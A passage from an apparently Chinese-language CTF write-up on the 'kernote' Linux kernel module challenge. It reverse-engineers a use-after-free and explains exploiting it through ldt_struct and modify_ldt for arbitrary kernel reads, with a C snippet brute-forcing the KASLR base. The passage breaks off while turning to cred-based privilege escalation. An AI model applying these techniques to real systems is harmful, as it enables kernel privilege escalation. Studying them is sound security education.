quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on&quot;</span> \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=2 \</span><br><span class="line">-nographic \</span><br><span class="line">-cpu kvm64,+smep,+smap \</span><br><span class="line">-no-reboot \</span><br><span class="line">-snapshot \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><ul><li>开启了 SMAP &amp; SMEP（用户空间数据访问（access）、执行（execute）保护）</li><li>开启了 KASLR（内核地址空间随机化）</li><li>开启了 KPTI（内核页表隔离）</li></ul><h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>题目给出了一个内核模块 <code>kernote.ko</code>，按惯例这便是存在漏洞的内核模块</p><p>拖入 IDA 进行分析，不能看出是常见的内核菜单堆形式，只定义了 ioctl且加了🔒</p><h4 id="0x6667-分配-object"><a href="#0x6667-分配-object" class="headerlink" title="0x6667. 分配 object"></a>0x6667. 分配 object</h4><p>0x6667 功能可以分配 object，在这里存在一个全局指针数组 buf 用以存放 object 指针，我们最多可以同时存放 0xF 个 object 指针，而分配的大小限定为 0x8</p><p><img src="https://i.loli.net/2021/10/27/rMzk1F8OsVdXeZW.png" alt="image.png"></p><p>在这里有一个 slab 与 slub 相不同的点：对于以往的 slub 分配器而言，若是我们 kmalloc(8) 则通常会从 <code>kmalloc-8</code> 中取大小为 8 的 object；但是在 slab 源码中有如下定义：</p><blockquote><p>内核源码版本5.11，include&#x2F;linux&#x2F;slab.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The largest kmalloc size supported by the SLAB allocators is</span></span><br><span class="line"><span class="comment"> * 32 megabyte (2^25) or the maximum allocatable page order if that is</span></span><br><span class="line"><span class="comment"> * less than 32 MB.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * WARNING: Its not easy to increase this value since the allocators have</span></span><br><span class="line"><span class="comment"> * to do various tricks to work around compiler limitations in order to</span></span><br><span class="line"><span class="comment"> * ensure proper constant folding.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1) &lt;= 25 ? \</span></span><br><span class="line"><span class="meta">                (MAX_ORDER + PAGE_SHIFT - 1) : 25)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_MAX    KMALLOC_SHIFT_HIGH</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_SHIFT_LOW</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_SHIFT_LOW    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Kmalloc subsystem.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> KMALLOC_MIN_SIZE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KMALLOC_MIN_SIZE (1 &lt;&lt; KMALLOC_SHIFT_LOW)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>即 slab 分配器分配的 object 的大小<strong>最小为 32</strong>，那么我们应当是从 <code>kmalloc-32</code> 中取 object</p><blockquote><p>阅读源码我们可以发现 slab 为 32， 而 slob 和 slub 都是 8</p></blockquote><h4 id="0x6666-保存-object-指针到全局变量-note"><a href="#0x6666-保存-object-指针到全局变量-note" class="headerlink" title="0x6666. 保存 object 指针到全局变量 note"></a>0x6666. 保存 object 指针到全局变量 note</h4><p>这个功能将 buf 数组中指定 object 指针存放到全局变量 note 中，我们不难想到这里<strong>可能会有 UAF</strong>，后续分析我们可以发现确实如此</p><p><img src="https://i.loli.net/2021/10/27/NudsLpgC7yZE45h.png" alt="image.png"></p><h4 id="0x6668-释放指定-object"><a href="#0x6668-释放指定-object" class="headerlink" title="0x6668. 释放指定 object"></a>0x6668. 释放指定 object</h4><p>比较纯粹的 free 功能，注意到这里是释放的 buf 数组内 object 后清空，<strong>但是没有清空 note 数组</strong>，一个 UAF 已经呼之欲出了</p><p><img src="https://i.loli.net/2021/10/27/kPEM6tCymF1HiO5.png" alt="image.png"></p><h4 id="0x6669-向-note-指向-object-内写入-8-字节"><a href="#0x6669-向-note-指向-object-内写入-8-字节" class="headerlink" title="0x6669. 向 note 指向 object 内写入 8 字节"></a>0x6669. 向 note 指向 object 内写入 8 字节</h4><p>UAF 已经贴脸了（）</p><p><img src="https://i.loli.net/2021/10/27/rFMhKICwqvjlemY.png" alt="image.png"></p><h4 id="0x666A-打印-note-所存-object-地址（无效功能）"><a href="#0x666A-打印-note-所存-object-地址（无效功能）" class="headerlink" title="0x666A. 打印 note 所存 object 地址（无效功能）"></a>0x666A. 打印 note 所存 object 地址（无效功能）</h4><p>比赛的时候分析得比较痛苦的一个功能…赛后出题人说这个功能写来玩的（🔨）</p><p>一开始首先从一个奇怪的地方取了一个值，<del>虽然赛后看出题人写的源代码不是这个样子，但众所周知内核的很多宏展开及多层结构体套娃给逆向工作带来极大困难</del></p><p><img src="https://i.loli.net/2021/10/27/DT9OfQBsFG2iHtE.png" alt="image.png"></p><p>笔者在比赛期间猜测应当是 <code>current_task-&gt;cred</code> 中某个值，后面找了对应内核版本源码自己写了个内核模块瞎猜偏移，最后试出来是<code>current_task-&gt;cred-&gt;user-&gt;__count</code></p><p>前面这一段代码首先给 <code>current_task-&gt;cred-&gt;user</code> 的引用计数器 <code>__count</code> 成员 + 1，对应内核函数 <code>refcount_inc()</code> ，多层套娃调用展开后如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __refcount_add(<span class="type">int</span> i, <span class="type">refcount_t</span> *r, <span class="type">int</span> *oldp)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> old = atomic_fetch_add_relaxed(i, &amp;r-&gt;refs);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oldp)</span><br><span class="line">        *oldp = old;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(!old))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_UAF);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(old &lt; <span class="number">0</span> || old + i &lt; <span class="number">0</span>))</span><br><span class="line">        refcount_warn_saturate(r, REFCOUNT_ADD_OVF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这段代码就不难理解了（<del>不用理解了</del>），v6 指向<code>current_task-&gt;cred-&gt;user-&gt;__count</code>，而 <code>__count</code> 是 user_struct 结构体的第一个成员，也就是 v6 指向 <code>current_task-&gt;cred-&gt;user</code></p><blockquote><p>赛后看出题人给的源码，这一段代码其实就只是一个 <code>get_current_user()</code></p></blockquote><p>那么下面的代码我们很容易看出是检测 <code>current_task-&gt;cred-&gt;user-&gt;uid-&gt;val</code>（uid 里面就封装了一个 val） 是否为0 ，若为 0 也就是 root 才会进入到 kernote_ioctl_cold 中</p><p><img src="https://i.loli.net/2021/10/27/VzDEscud1xeKiP5.png" alt="image.png"></p><p>最终 kernote_ioctl_cold 会打印 note 中存的 object 的地址，<strong>但是我们一开始肯定不是 root 所以这个功能没有任何意义</strong></p><p><img src="https://i.loli.net/2021/10/27/fzorATm3OpHydl9.png" alt="image.png"></p><blockquote><p>这个功能当时还差点让笔者分析错方向，我们前面已经有了一个 UAF，但在此处调用 get_current_user() 时 user 的引用计数器（user-&gt;__count）自动 + 1，而在结束时并没有让引用计数器自减 1（没有“释放”掉引用），这本身也算是一个 bug，但实质上与解题是无关的 bug</p><blockquote><p>当然，这个 bug 也没法帮助我们完成提权</p></blockquote><p>因而官方当时发了这样一个公告：</p><p><img src="https://i.loli.net/2021/10/29/KYq9ACw7eZhFXPv.png" alt="image.png"></p><p>由于笔者的英文水平自从上了大学之后便几乎没有长进，在笔者看来——<code>release</code> 指的应该就是 <code>free</code>，也就是说指的是前面的垂悬指针并不是题目的考察点（那这还怎么解题啊），于是有了如下对话：</p><p><img src="https://i.loli.net/2021/10/29/uyaowMvQY4INV32.png" alt="image.png"></p><p><del>虽然最后直到比赛结束笔者也没解出这道题</del></p></blockquote><h2 id="二、漏洞利用-1"><a href="#二、漏洞利用-1" class="headerlink" title="二、漏洞利用"></a>二、漏洞利用</h2><p>那么我们现在只有一个 UAF，而且只能写 8 字节，没法直接泄露内核相关数据，分配的 object 大小限制为 32，这无疑为我们的解题增添了一定难度</p><h3 id="ldt-struct-结构体"><a href="#ldt-struct-结构体" class="headerlink" title="ldt_struct 结构体"></a>ldt_struct 结构体</h3><p>笔者参照官方题解选择使用 <code>ldt_struct</code> 这个内核结构体进行进一步利用，这里先简单讲一下这是个什么东西：</p><p>ldt 即<strong>局部段描述符表</strong>（<strong>Local Descriptor Table</strong>），其中存放着<strong>进程的</strong>段描述符，段寄存器当中存放着的段选择子便是段描述符表中段描述符的索引</p><p>该结构体定义于内核源码 <code>arch/x86/include/asm/mmu_context.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Xen requires page-aligned LDTs with special permissions.  This is</span></span><br><span class="line"><span class="comment">     * needed to prevent us from installing evil descriptors such as</span></span><br><span class="line"><span class="comment">     * call gates.  On native, we could merge the ldt_struct and LDT</span></span><br><span class="line"><span class="comment">     * allocations, but it&#x27;s not worth trying to optimize.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span>    *<span class="title">entries</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        nr_entries;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * If PTI is in use, then the entries array is not mapped while we&#x27;re</span></span><br><span class="line"><span class="comment">     * in user mode.  The whole array will be aliased at the addressed</span></span><br><span class="line"><span class="comment">     * given by ldt_slot_va(slot).  We use two slots so that we can allocate</span></span><br><span class="line"><span class="comment">     * and map, and enable a new LDT without invalidating the mapping</span></span><br><span class="line"><span class="comment">     * of an older, still-in-use LDT.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * slot will be -1 if this LDT doesn&#x27;t have an alias mapping.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span>            slot;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构体大小仅为 0x10，在分配时 slab 分配器毫无疑问会从 kmalloc-32 中取，且我们可控的其前八个字节又刚好是一个指针，为我们后续的利用提供了一定的便利性</p><h4 id="desc-struct-结构体"><a href="#desc-struct-结构体" class="headerlink" title="desc_struct 结构体"></a>desc_struct 结构体</h4><p>我们所能控制的 entries 指针为 <code>desc_struct</code> 结构体，即<strong>段描述符</strong>，定义于 <code>/arch/x86/include/asm/desc_defs.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 8 byte segment descriptor */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">desc_struct</span> &#123;</span></span><br><span class="line">    u16    limit0;</span><br><span class="line">    u16    base0;</span><br><span class="line">    u16    base1: <span class="number">8</span>, type: <span class="number">4</span>, s: <span class="number">1</span>, dpl: <span class="number">2</span>, p: <span class="number">1</span>;</span><br><span class="line">    u16    limit1: <span class="number">4</span>, avl: <span class="number">1</span>, l: <span class="number">1</span>, d: <span class="number">1</span>, g: <span class="number">1</span>, base2: <span class="number">8</span>;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><h5 id="低-32-位"><a href="#低-32-位" class="headerlink" title="低 32 位"></a>低 32 位</h5><table><thead><tr><th align="center">31~16</th><th align="center">15~0</th></tr></thead><tbody><tr><td align="center">段基址的 15~0 位</td><td align="center">段界限的 15~0 位</td></tr></tbody></table><p>段基址 32 位，段界限为 20 位，其所能够表示的地址范围为：</p><p><code>段基址 + （段粒度大小 x （段界限+1）） - 1</code></p><h5 id="高-32-位"><a href="#高-32-位" class="headerlink" title="高 32 位"></a>高 32 位</h5><table><thead><tr><th align="center">31~24</th><th align="center">23</th><th align="center">22</th><th align="center">21</th><th align="center">20</th><th align="center">19~16</th><th align="center">15</th><th align="center">14~13</th><th align="center">12</th><th align="center">11~8</th><th align="center">7~0</th></tr></thead><tbody><tr><td align="center">段基址的 31~24 位</td><td align="center">G</td><td align="center">D&#x2F;B</td><td align="center">L</td><td align="center">AVL</td><td align="center">段界限的 19 ~16 位</td><td align="center">P</td><td align="center">DPL</td><td align="center">S</td><td align="center">TYPE</td><td align="center">段基址的 23~16 位</td></tr></tbody></table><p>各参数便不在此赘叙了，具其构造可以参见<a href="https://arttnba3.cn/2021/06/24/CODE-0X00-A3OS/#%E4%B8%89%E3%80%81%E5%85%A8%E5%B1%80%E6%8F%8F%E8%BF%B0%E7%AC%A6%E8%A1%A8%EF%BC%88Global-Descriptor-Table%EF%BC%89">全局描述符表（Global Descriptor Table） - arttnba3.cn</a></p><h3 id="modify-ldt-系统调用"><a href="#modify-ldt-系统调用" class="headerlink" title="modify_ldt 系统调用"></a>modify_ldt 系统调用</h3><p>Linux 提供给我们一个叫 <code>modify_ldt</code> 的系统调用，通过该系统调用我们可以<strong>获取或修改当前进程的 LDT</strong></p><p>我们来看一下在内核中这个系统调用是如何操纵 ldt 的，该系统调用定义于 <code>/arch/x86/kernel/ldt.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(modify_ldt, <span class="type">int</span> , func , <span class="type">void</span> __user * , ptr ,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> , bytecount)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> ret = -ENOSYS;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (func) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        ret = read_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        ret = read_default_ldt(ptr, bytecount);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">        ret = write_ldt(ptr, bytecount, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;</span></span><br><span class="line"><span class="comment">     * return type, but tht ABI for sys_modify_ldt() expects</span></span><br><span class="line"><span class="comment">     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax</span></span><br><span class="line"><span class="comment">     * for the return code.  The &#x27;unsigned&#x27; is necessary so</span></span><br><span class="line"><span class="comment">     * the compiler does not try to sign-extend the negative</span></span><br><span class="line"><span class="comment">     * return codes into the high half of the register when</span></span><br><span class="line"><span class="comment">     * taking the value from int-&gt;long.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们应当传入三个参数：func、ptr、bytecount，其中 ptr 应为指向 <code>user_desc</code> 结构体的指针，参照 man page 可知该结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  entry_number;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  base_addr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_32bit:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  contents:<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  read_exec_only:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  limit_in_pages:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  seg_not_present:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>  useable:<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="read-ldt-：内核任意地址读"><a href="#read-ldt-：内核任意地址读" class="headerlink" title="read_ldt()：内核任意地址读"></a>read_ldt()：内核任意地址读</h4><p>定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">read_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(ptr, mm-&gt;context.ldt-&gt;entries, entries_size)) &#123;</span><br><span class="line">        retval = -EFAULT;</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock:</span><br><span class="line">    up_read(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里会<strong>直接调用 copy_to_user 向用户地址空间拷贝数据</strong>，我们不难想到的是若是能够控制 ldt-&gt;entries 便能够完成内核的任意地址读，由此泄露出内核数据</p><h4 id="write-ldt-：分配新的-ldt-struct-结构体"><a href="#write-ldt-：分配新的-ldt-struct-结构体" class="headerlink" title="write_ldt()：分配新的 ldt_struct 结构体"></a>write_ldt()：分配新的 ldt_struct 结构体</h4><p>定义于 <code>/arch/x86/kernel/ldt.c</code>中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">write_ldt</span><span class="params">(<span class="type">void</span> __user *ptr, <span class="type">unsigned</span> <span class="type">long</span> bytecount, <span class="type">int</span> oldmode)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (bytecount != <span class="keyword">sizeof</span>(ldt_info))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    error = -EFAULT;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;ldt_info, ptr, <span class="keyword">sizeof</span>(ldt_info)))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    error = -EINVAL;</span><br><span class="line">    <span class="keyword">if</span> (ldt_info.entry_number &gt;= LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    old_ldt       = mm-&gt;context.ldt;</span><br><span class="line">    old_nr_entries = old_ldt ? old_ldt-&gt;nr_entries : <span class="number">0</span>;</span><br><span class="line">    new_nr_entries = max(ldt_info.entry_number + <span class="number">1</span>, old_nr_entries);</span><br><span class="line"></span><br><span class="line">    error = -ENOMEM;</span><br><span class="line">    new_ldt = alloc_ldt_struct(new_nr_entries);</span><br><span class="line">    <span class="keyword">if</span> (!new_ldt)</span><br><span class="line">        <span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (old_ldt)</span><br><span class="line">        <span class="built_in">memcpy</span>(new_ldt-&gt;entries, old_ldt-&gt;entries, old_nr_entries * LDT_ENTRY_SIZE);</span><br><span class="line"></span><br><span class="line">    new_ldt-&gt;entries[ldt_info.entry_number] = ldt;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    install_ldt(mm, new_ldt);</span><br><span class="line">    unmap_ldt_struct(mm, old_ldt);</span><br><span class="line">    free_ldt_struct(old_ldt);</span><br><span class="line">    error = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">    up_write(&amp;mm-&gt;context.ldt_usr_sem);</span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到在 write_ldt() 当中会使用 alloc_ldt_struct() 函数来为新的 ldt_struct 分配空间，随后将之应用到进程， alloc_ldt_struct() 函数定义于 <code>arch/x86/kernel/ldt.c</code> 中，我们主要关注如下逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The caller must call finalize_ldt_struct on the result. LDT starts zeroed. */</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> ldt_struct *<span class="title function_">alloc_ldt_struct</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> num_entries)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ldt_struct</span> *<span class="title">new_ldt</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> alloc_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (num_entries &gt; LDT_ENTRIES)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    new_ldt = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ldt_struct), GFP_KERNEL);</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>可以看到的是，ldt_struct 结构体通过 kmalloc() 从 <code>kmalloc-xx</code> 中取，对于 slab 分配器即为从 <code>kmalloc-32</code> 中取，由此我们可以得到如下解题思路：</p><ul><li>先分配一个 object 后释放</li><li>通过 write_ldt() 将这个 object 重新取回</li><li>通过 UAF 更改 ldt-&gt;entries</li><li>通过 read_ldt() 搜索内核地址空间</li></ul><p>接下来我们考虑如何完成提权</p><h3 id="解法一：遍历内存修改进程-cred-提权（官方解法）"><a href="#解法一：遍历内存修改进程-cred-提权（官方解法）" class="headerlink" title="解法一：遍历内存修改进程 cred 提权（官方解法）"></a>解法一：遍历内存修改进程 cred 提权（官方解法）</h3><p>这个解法是官方给出的解法，利用 modify_ldt 系统调用完成对内核空间的遍历与修改</p><h4 id="Step-I-泄露-page-offset-base"><a href="#Step-I-泄露-page-offset-base" class="headerlink" title="Step I. 泄露 page_offset_base"></a>Step I. 泄露 page_offset_base</h4><p>由于开启了 kaslr 的缘故，我们需要想方法泄露内核空间相关地址，在这里官方题解给出了一种美妙的解法——我们可以<strong>直接爆破内核地址</strong>：对于无效的地址，copy_to_user 会返回非 0 值，此时 read_ldt() 的返回值便是 <code>-EFAULT</code>，当 read_ldt() 执行成功时，说明我们命中了内核空间</p><p>爆破代码逻辑很容易就能写出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_desc</span>     <span class="title">desc</span>;</span></span><br><span class="line"><span class="type">size_t</span>                 kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span>                temp;</span><br><span class="line"><span class="type">int</span>                 retval;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">chunkSet(<span class="number">0</span>);</span><br><span class="line">chunkDel(<span class="number">0</span>);</span><br><span class="line">syscall(SYS_modify_ldt, <span class="number">1</span>, &amp;desc, <span class="keyword">sizeof</span>(desc));</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    chunkEdit(kernel_base);</span><br><span class="line">    retval = syscall(SYS_modify_ldt, <span class="number">0</span>, &amp;temp, <span class="number">8</span>);<span class="comment">// final param should be 8 there</span></span><br><span class="line">    <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    kernel_base += <span class="number">0x200000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是本题开启了 <code>hardened usercopy</code> 保护，当 copy_to_user() 的源地址为内核 .text 段（_stext, _etext）时<strong>会引起 kernel panic</strong></p><p>那么这里我们可以考虑更改思路——搜索<code>物理地址直接映射区</code>，<strong>我们的 task_struct 